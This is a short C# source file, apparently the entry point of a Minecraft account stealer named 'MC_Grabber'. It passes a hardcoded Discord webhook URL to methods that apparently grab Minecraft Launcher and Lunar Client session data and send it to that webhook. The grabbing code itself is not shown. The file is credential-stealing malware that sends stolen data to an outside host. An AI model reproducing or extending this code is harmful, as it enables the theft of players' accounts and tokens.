using System;

namespace MC_Grabber
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("---> Works Only With Minecraft Launcher & Lunar.");
            Console.WriteLine("");
            Console.WriteLine("---> User Should Launch With Forge / Vanilla / ETC.");
            Grab grabber = new Grab();
            grabber.Minecraft("https://discordapp.com/api/webhooks/1009953235240493076/VjQs_MYOhRuQ7Ma1uqrpPPgXwzxsuRU_4cZzE7vHdUZZET26h94ERn8zWAeEZ5vxlMga");
            grabber.Lunar("https://discordapp.com/api/webhooks/1009953235240493076/VjQs_MYOhRuQ7Ma1uqrpPPgXwzxsuRU_4cZzE7vHdUZZET26h94ERn8zWAeEZ5vxlMga");
        }
    }
}
